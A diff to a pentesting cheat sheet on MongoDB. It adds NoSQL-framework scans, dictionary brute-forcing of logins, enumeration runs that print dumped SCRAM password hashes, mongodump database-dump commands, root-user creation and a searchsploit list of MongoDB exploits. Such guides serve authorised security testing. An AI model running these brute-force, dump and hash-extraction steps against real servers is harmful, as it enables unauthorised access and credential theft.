@@ -208,10 +208,10 @@ MongoDB authentication
 --------------------------
   pentester@KaliLinux> nmap -sV -sS -vv 192.168.1.234 -p 28017,27017,27018,27018
 
-    27017 - This is the default port mongod and mongos (mongo shell) instances. You can change this port with port or --port.
+    27017 - This is the default port mongod and mongos (mongo shell) instances.
     27018 - This is the default port when running with --shardsvr runtime operation or shardsvr setting.
     27019 - This is the default port when running with --configsvr runtime operation or configsvr setting.
-    28017 - This is the default port for the web status page. This is always accessible at a port that is 1000 greater than the port determined by port.
+    28017 - This is the default port for the web status page.
 
 
   pentester@KaliLinux> nmap -Pn -p 27017 --script mongodb-databases x.x.x.x
@@ -240,6 +240,18 @@ MongoDB authentication
 	Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
 
 
+2. Nosql-Exploitation-Framework (https://github.com/torque59/Nosql-Exploitation-Framework)
+------------------------------------------------------------------------------------------
+
+  jeff@kali-Linux:~/Documents/Tools/Nosql-Exploitation-Framework-master$ sudo docker run -it torque59/nosqlframework -ip 192.168.1.104 -scan
+	
+	[+] 192.168.1.104 is up!
+	[!] Scanning Module For NoSQL Framework Launched.....                                                                                                                                                                                                                                                                                   
+	[-] MongoDB port open on 192.168.1.104:27017!                                                                                                                                                    
+	[-] CouchDB port closed. 
+	[-] RedisDB port open on 192.168.1.104:6479! 
+
+                                                  
 ==========================================================================================================
 03. How to perform a password brute-force attack to identify valid database credentials (logins/passwords)
 ==========================================================================================================
@@ -252,10 +264,16 @@ MongoDB authentication
 
 
 2. METASPLOIT - MongoDB Login Utility (Brute Force)
----------------------------------------------------------------
+-----------------------------------------------------
 • This module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication.
 • https://www.rapid7.com/db/modules/auxiliary/scanner/mongodb/mongodb_login
 • auxiliary/scanner/mongodb/mongodb_login
+
+
+3. Nosql-Exploitation-Framework (https://github.com/torque59/Nosql-Exploitation-Framework)
+------------------------------------------------------------------------------------------
+
+  pentester@KaliLinux> python3 ./nosqlframework.py -ip <localhost> -dict mongo -file user-pass-file-dico.txt
 
 
 ==========================================================================================================
@@ -294,9 +312,14 @@ MongoDB authentication
 	
 • Useful commands
 -----------------
-> mongo@mongo:~$ sudo service mongod start mongod start/running, process 2210		-- start a MongoDB instance
+> mongo@mongo:~$ sudo service mongod start mongod start/running, process 2210	-- start a MongoDB instance
+
+> mongo@mongo:~$ sudo mongod --auth --port 27019 --dbpath /var/lib/mongodb 	-- start a MongoDB instance ('--auth' means no anonymous access)
 
 > mongo@mongo:~$ sudo mongod -httpinterface -rest -smallfiles
+
+> Mongodump -u <user> -p <pass> -h <IP> --db <db_name>			-- Dump the DB for off-line grepping
+> Mongodump -u foo -p bar -h 10.10.10.10 --db SecretDB
 
 > use admin								-- access the admin database (from the localhost interface)
 > db.adminCommand( { "hostInfo" : 1 } )					-- Show server info
@@ -317,8 +340,6 @@ MongoDB authentication
 > db.<collection_name>.find( { <column_name> : "<value>" } 		-- Search for exact match in the table/collection
 > db.<collection_name>.find( { <column_name> : /<value>/i } )		-- Wildcard search data in the table/collection
 > db.users.find( { name : /tony/i } )					-- Wildcard search user tony in the table/collection users
-> Mongodump -u <user> -p <pass> -h <IP> --db <db_name>			-- Dump the DB for off-line grepping
-> Mongodump -u foo -p bar -h 10.10.10.10 --db SecretDB
 > db.system.profile.find()						-- Logs
 > db.getProfilingLevel()   						--To see what profiling level the database is running in, use
 > db.getProfilingStatus()  						-- and to see the status
@@ -363,6 +384,18 @@ MongoDB authentication
 		   { "role" : "read", "db" : "sales" }
 	 ]
 
+> db.createUser(			-- Create a user which is member of the superuser role 'root'.
+  {
+    user: "mongo-root-user",
+    pwd: "passw0rd",
+    roles: [ { role: "root", db: "admin" } ]
+  }
+)
+
+Admin role vs Root role
+-----------------------
+=> The role 'userAdminAnyDatabase' in MongoDB gives ability to create users and assign roles to them, but by itself it doesn’t allow the user to do anything else. 
+=> The superuser role in MongoDB is the role 'root'.
 
 • NMAP - 'mongodb-info' module
 -----------------------------------
@@ -429,9 +462,9 @@ MongoDB authentication
 	<SNIP>
 
 
-==========================================================================================================
-05. How to audit/test the security posture of a MongoDB (tools: mongoaudit, nosqlmap)
-==========================================================================================================
+===================================================================================================================
+05. How to audit/test the security posture of a MongoDB (tools: mongoaudit, nosqlmap, nosql-exploitation-framework)
+===================================================================================================================
 
 1. Security Checklist
 -----------------------
@@ -456,7 +489,7 @@ Note: The configuration file "/etc/mongod.conf" must be reviewed.
 
 
 2. Tool "Mongoaudit" (https://github.com/stampery/mongoaudit)
------------------------------------------------------------
+--------------------------------------------------------------
 
 • Mongoaudit is a CLI tool for auditing MongoDB servers, detecting poor security settings and performing automated penetration testing.
 
@@ -590,6 +623,160 @@ Note: The configuration file "/etc/mongod.conf" must be reviewed.
 		Select a database to steal: 2
 		Does this database require credentials (y/n)? n
 
+
+
+3. Tool "Nosql-Exploitation-Framework" (https://github.com/torque59/Nosql-Exploitation-Framework)
+--------------------------------------------------------------------------------------------------
+Allow to scan a MongDB database and enumerate db configuration as well as dump any data including password hashes.
+If anonymous db access is disabled then a valid db admin account member of the role 'root' is required to scan the MongoDB.
+
+Example 1 - Anonymous db admin access is enabled
+-------------------------------------------------
+  jeff@kali-Linux:~/Documents/Tools/Nosql-Exploitation-Framework-master$ sudo docker run -it torque59/nosqlframework -ip 192.168.1.104 -enum mongo
+	[sudo] password for jeff: 
+	[+] 192.168.1.104 is up!
+	[+] MongoDB port open on 192.168.1.104:27017!
+	[+] Enumeration Module For NoSQL Framework Launched .. 
+	[!] Server Info: 
+		[-]OpenSSLVersion:OpenSSL 1.0.1f 6 Jan 2014
+		[-]versionArray:[3, 0, 15, 0]
+		[-]gitVersion:b8ff507269c382bc100fc52f75f48d54cd42ec3b
+		[-]allocator:tcmalloc
+		[-]maxBsonObjectSize:16777216
+		[-]loaderFlags:
+		[-]sysInfo:Linux ip-10-71-195-23 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
+		[-]javascriptEngine:V8
+		[-]debug:False
+		[-]ok:1.0
+		[-]version:3.0.15
+		[-]compilerFlags:-Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99                                                                                                                                
+		[-]bits:64
+	[+] Checking for the Command Line Arguments
+		[+] argv:['/usr/bin/mongod', '--config', '/etc/mongod.conf']
+		[+] parsed:{'net': {'port': 27017, 'bindIp': '0.0.0.0'}, 'storage': {'journal': {'enabled': True}, 'dbPath': '/var/lib/mongodb'}, 'systemLog': {'logAppend': True, 'path': '/var/log/mongodb/mongod.log', 'destination': 'file'}, 'config': '/etc/mongod.conf'}                                                                     
+		[+] ok:1.0
+	[!] Clients Connected: 
+		[-]192.168.1.20:40254
+	[!] List of databases:
+		[+]credentials
+		[+]admin
+		[+]local
+		[-] admin:
+			[-]system.indexes
+	[!] Found system.users for 'admin' Checking for Users and Password Hashes:                                                                                            
+	[+] Found 'admin' Users and Password Hashes:                                                                                                                          
+	[-][{'credentials': {'SCRAM-SHA-1': {'salt': 'J0J71ZYp3U0/2vMhOoo8CQ==', 'serverKey': 'WSGMTuMeOyRh5XaEEGmzHHL8Jz8=', 'storedKey': 'CQPnEyDULuBVAFcRYN1uqYmvA3M=', 'iterationCount': 10000}}, 'db': 'admin', 'roles': [{'role': 'userAdminAnyDatabase', 'db': 'admin'}], '_id': 'admin.audit', 'user': 'audit'}, {'credentials': {'SCRAM-SHA-1': {'salt': 'S2tJcvT4aBdlzB/iEfsybg==', 'serverKey': 'dnWkMkFQriNnRElQongVe3AkZis=', 'storedKey': 'nlDIyRt8JPOlU0pIn3aU0MMeCws=', 'iterationCount': 10000}}, 'db': 'admin', 'roles': [{'role': 'userAdmin', 'db': 'Employee'}], '_id': 'admin.Employeeadmin', 'user': 'Employeeadmin'}]                                                   
+
+			[-]system.users
+	[!] Found system.users for 'admin' Checking for Users and Password Hashes:                                                                                            
+	[+] Found 'admin' Users and Password Hashes:                                                                                                                          
+	[-][{'credentials': {'SCRAM-SHA-1': {'salt': 'J0J71ZYp3U0/2vMhOoo8CQ==', 'serverKey': 'WSGMTuMeOyRh5XaEEGmzHHL8Jz8=', 'storedKey': 'CQPnEyDULuBVAFcRYN1uqYmvA3M=', 'iterationCount': 10000}}, 'db': 'admin', 'roles': [{'role': 'userAdminAnyDatabase', 'db': 'admin'}], '_id': 'admin.audit', 'user': 'audit'}, {'credentials': {'SCRAM-SHA-1': {'salt': 'S2tJcvT4aBdlzB/iEfsybg==', 'serverKey': 'dnWkMkFQriNnRElQongVe3AkZis=', 'storedKey': 'nlDIyRt8JPOlU0pIn3aU0MMeCws=', 'iterationCount': 10000}}, 'db': 'admin', 'roles': [{'role': 'userAdmin', 'db': 'Employee'}], '_id': 'admin.Employeeadmin', 'user': 'Employeeadmin'}]                          
+	<SNIP>
+
+Example 2 - Authentication is enabled and we use a valid db admin account member of the role 'root'
+-----------------------------------------------------------------------------------------------------
+	
+  jeff@kali-Linux:~/Documents$ sudo docker run -it torque59/nosqlframework -ip 192.168.1.104 -enum mongo -auth mongo-root:passw0rd
+	[+] 192.168.1.104 is up!
+	[+] MongoDB port open 192.168.1.104:27017 
+	[+] Enumeration Module For NoSQL Framework Launched .. 
+	[-] Retrying with Supplying Credentials
+	admin
+	[!] Server Info: 
+		[-]maxBsonObjectSize:16777216
+		[-]OpenSSLVersion:OpenSSL 1.0.1f 6 Jan 2014
+		[-]compilerFlags:-Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99
+		[-]loaderFlags:
+		[-]ok:1.0
+		[-]versionArray:[3, 0, 15, 0]
+		[-]javascriptEngine:V8
+		[-]allocator:tcmalloc
+		[-]sysInfo:Linux ip-10-71-195-23 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
+		[-]bits:64
+		[-]version:3.0.15
+		[-]gitVersion:b8ff507269c382bc100fc52f75f48d54cd42ec3b
+		[-]debug:False
+	[+] Checking for the Command Line Arguments
+		[+] ok:1.0
+		[+] argv:['mongod', '--auth', '--port', '27017', '--dbpath', '/var/lib/mongodb']
+		[+] parsed:{'storage': {'dbPath': '/var/lib/mongodb'}, 'net': {'port': 27017}, 'security': {'authorization': 'enabled'}}
+	[!] Clients Connected: 
+		[-]192.168.1.20:40730
+	[!] List of databases:
+		[+]credentials
+		[+]admin
+		[+]local
+		[-] admin:
+			[-]system.indexes
+	[!] Found system.users for 'admin' Checking for Users and Password Hashes:
+	[+] Found 'admin' Users and Password Hashes:
+	[-][{'db': 'admin', 'roles': [{'db': 'admin', 'role': 'userAdminAnyDatabase'}], 'credentials': {'SCRAM-SHA-1': {'serverKey': 'WSGMTuMeOyRh5XaEEGmzHHL8Jz8=', 'iterationCount': 10000, 'storedKey': 'CQPnEyDULuBVAFcRYN1uqYmvA3M=', 'salt': 'J0J71ZYp3U0/2vMhOoo8CQ=='}}, 'user': 'audit', '_id': 'admin.audit'}, {'db': 'admin', 'roles': [{'db': 'Employee', 'role': 'userAdmin'}], 'credentials': {'SCRAM-SHA-1': {'serverKey': 'dnWkMkFQriNnRElQongVe3AkZis=', 'iterationCount': 10000, 'storedKey': 'nlDIyRt8JPOlU0pIn3aU0MMeCws=', 'salt': 'S2tJcvT4aBdlzB/iEfsybg=='}}, 'user': 'Employeeadmin', '_id': 'admin.Employeeadmin'}, {'db': 'admin', 'roles': [{'db': 'admin', 'role': 'root'}], 'credentials': {'SCRAM-SHA-1': {'serverKey': 'MHHmRRohJyaGxtXaj1FEiSAFaTY=', 'iterationCount': 10000, 'storedKey': 'pqMRNAzpTjR0CMdI8ojgW8Vk8gs=', 'salt': 'abLsIBE302xZFIGNY+jpBA=='}}, 'user': 'mongo-root', '_id': 'admin.mongo-root'}]
+	<SNIP>
+	
+Example 3 - Authentication is enabled and we enter valid low-privileged credentials
+-----------------------------------------------------------------------------------
+
+  jeff@kali-Linux:~/Documents/docker$ sudo docker run -it torque59/nosqlframework -ip 192.168.1.104 -enum mongo -auth Employeeadmin:password
+	[+] 192.168.1.104 is up!
+	[+] MongoDB port open 192.168.1.104:27017 
+	[+] Enumeration Module For NoSQL Framework Launched .. 
+	[-] Retrying with Supplying Credentials
+	admin
+	[!] Server Info: 
+		[-]bits:64
+		[-]maxBsonObjectSize:16777216
+		[-]javascriptEngine:V8
+		[-]version:3.0.15
+		[-]compilerFlags:-Wnon-virtual-dtor -Woverloaded-virtual -std=c++11 -fno-omit-frame-pointer -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fno-builtin-memcmp -std=c99                                                                                                                                
+		[-]sysInfo:Linux ip-10-71-195-23 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49
+		[-]versionArray:[3, 0, 15, 0]
+		[-]OpenSSLVersion:OpenSSL 1.0.1f 6 Jan 2014
+		[-]ok:1.0
+		[-]loaderFlags:
+		[-]gitVersion:b8ff507269c382bc100fc52f75f48d54cd42ec3b
+		[-]debug:False
+		[-]allocator:tcmalloc
+	[+] Checking for the Command Line Arguments
+		 [-] Failed Exception : not authorized on admin to execute command { getCmdLineOpts: 1 }
+	
+	[!] Could not Fetch Clients Connected 
+		[-] Unauthorized Supply Creds 
+
+	[!] List of databases:
+		[-] Error Occured:not authorized on admin to execute command { listDatabases: 1, nameOnly: true }
+		[-] Eror Occured:not authorized on admin to execute command { listCollections: 1, cursor: {} }
+
+Example 4 - Authentication is enabled and we enter wrong credentials
+----------------------------------------------------------------------
+
+  jeff@kali-Linux:~/Documents/docker$ sudo docker run -it torque59/nosqlframework -ip 192.168.1.104 -enum mongo -auth Employeeadmin:password!
+	[+] 192.168.1.104 is up!
+	[+] MongoDB port open 192.168.1.104:27017 
+	[+] Enumeration Module For NoSQL Framework Launched .. 
+
+	[-] Authentication Failed with Credentials Employeeadmin:password!
+	<SNIP>
+
+
+4. Searchsploit / ExploitDB 
+----------------------------
+Look for public exploits affecting MongoDB databases.
+
+  jeff@kali-Linux:~/Documents$ searchsploit mongodb
+	----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                                                                                                                   |  Path (/usr/share/exploitdb/)
+	----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	MongoDB - 'conn' Mongo Object Remote Code Execution                                                                                                              | exploits/multiple/remote/38669.txt
+	MongoDB - nativeHelper.apply Remote Code Execution (Metasploit)                                                                                                  | exploits/linux/remote/24935.rb
+	MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution                                                                                                         | exploits/linux/remote/24947.txt
+	PHPmongoDB 1.0.0 - Multiple Vulnerabilities                                                                                                                      | exploits/php/webapps/39697.txt
+	RockMongo PHP MongoDB Administrator 1.1.8 - Multiple Vulnerabilities                                                                                             | exploits/php/webapps/39682.txt
+	phpMoAdmin MongoDB GUI 1.1.5 - Cross-Site Request Forgery / Cross-Site Scripting                                                                                 | exploits/php/webapps/46082.txt
+	----------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+	Shellcodes: No Result
+
+
+
 ==========================================================================================================
 06. How to dump and crack MongoDB password hashes
 ==========================================================================================================
@@ -597,34 +784,95 @@ Note: The configuration file "/etc/mongod.conf" must be reviewed.
 The system.users collection in the admin database stores user authentication and authorization information 
 (including password hashes). 
 
-1. Manual password hashes dump
+1. MongoDB password hashes dump
 --------------------------------
 Example of Mongodb commands that allow to list the users and their password hashes.
+These commands need to be run with an account which is member of the superuser role 'root'.
 
 Option 1 
+--------
 > use admin
-> db.getUsers( {showCredentials: true,  filter: { mechanisms: "SCRAM-SHA-256" }} )
+switched to db admin
+> db.system.users.find()
+{ "_id" : "admin.audit", "user" : "audit", "db" : "admin", "credentials" : { "SCRAM-SHA-1" : { "iterationCount" : 10000, "salt" : "J0J71ZYp3U0/2vMhOoo8CQ==", "storedKey" : "CQPnEyDULuBVAFcRYN1uqYmvA3M=", "serverKey" : "WSGMTuMeOyRh5XaEEGmzHHL8Jz8=" } }, "roles" : [ { "role" : "userAdminAnyDatabase", "db" : "admin" } ] }
+{ "_id" : "admin.Employeeadmin", "user" : "Employeeadmin", "db" : "admin", "credentials" : { "SCRAM-SHA-1" : { "iterationCount" : 10000, "salt" : "S2tJcvT4aBdlzB/iEfsybg==", "storedKey" : "nlDIyRt8JPOlU0pIn3aU0MMeCws=", "serverKey" : "dnWkMkFQriNnRElQongVe3AkZis=" } }, "roles" : [ { "role" : "userAdmin", "db" : "Employee" } ] }
+{ "_id" : "admin.mongo-root", "user" : "mongo-root", "db" : "admin", "credentials" : { "SCRAM-SHA-1" : { "iterationCount" : 10000, "salt" : "abLsIBE302xZFIGNY+jpBA==", "storedKey" : "pqMRNAzpTjR0CMdI8ojgW8Vk8gs=", "serverKey" : "MHHmRRohJyaGxtXaj1FEiSAFaTY=" } }, "roles" : [ { "role" : "root", "db" : "admin" } ] }
+
 
 Option 2
+---------
 > use admin
-> db.system.users.find()
-> db.system.users.findOne({user: "testUser"})
+switched to db admin
+> db.getUsers( {showCredentials: true})
+[
 	{
-	    "_id" : "admin.testUser",
-	    "user" : "testUser",
-	    "db" : "testdb",
-	    "credentials" : {
-		"SCRAM-SHA-1" : {
-		    "iterationCount" : 10000,
-		    "salt" : "+seF99VS0sZFe30VPBHA7A==",
-		    "storedKey" : "DYPbk/QJVowCNDPe2O2uWMmGq8U=",
-		    "serverKey" : "q4KAi4pVZNOLCgWcxcBr7jkM3m8="
-		}
-	    },
-	    "roles" : [
-		{
-		    "role" : "readWrite",
-		    "db" : "testDb"
+		"_id" : "admin.audit",
+		"user" : "audit",
+		"db" : "admin",
+		"credentials" : {
+			"SCRAM-SHA-1" : {
+				"iterationCount" : 10000,
+				"salt" : "J0J71ZYp3U0/2vMhOoo8CQ==",
+				"storedKey" : "CQPnEyDULuBVAFcRYN1uqYmvA3M=",
+				"serverKey" : "WSGMTuMeOyRh5XaEEGmzHHL8Jz8="
+			}
+		},
+		"roles" : [
+			{
+				"role" : "userAdminAnyDatabase",
+				"db" : "admin"
+			}
+		]
+	},
+	{
+		"_id" : "admin.Employeeadmin",
+		"user" : "Employeeadmin",
+		"db" : "admin",
+		"credentials" : {
+			"SCRAM-SHA-1" : {
+				"iterationCount" : 10000,
+				"salt" : "S2tJcvT4aBdlzB/iEfsybg==",
+				"storedKey" : "nlDIyRt8JPOlU0pIn3aU0MMeCws=",
+				"serverKey" : "dnWkMkFQriNnRElQongVe3AkZis="
+			}
+		},
+		"roles" : [
+			{
+				"role" : "userAdmin",
+				"db" : "Employee"
+			}
+		]
+	},
+	{
+		"_id" : "admin.mongo-root",
+		"user" : "mongo-root",
+		"db" : "admin",
+		"credentials" : {
+			"SCRAM-SHA-1" : {
+				"iterationCount" : 10000,
+				"salt" : "abLsIBE302xZFIGNY+jpBA==",
+				"storedKey" : "pqMRNAzpTjR0CMdI8ojgW8Vk8gs=",
+				"serverKey" : "MHHmRRohJyaGxtXaj1FEiSAFaTY="
+			}
+		},
+		"roles" : [
+			{
+				"role" : "root",
+				"db" : "admin"
+			}
+		]
+	}
+]
+
+Option 3
+---------
+If the Web interface is enabled:
+> http://192.168.1.234:28017/admin/system.users/
+
+
+Option 4
+---------
+Use the tool 'nosql-exploitation-framework'
 
 
 2. Password hashes cracking using John The Ripper
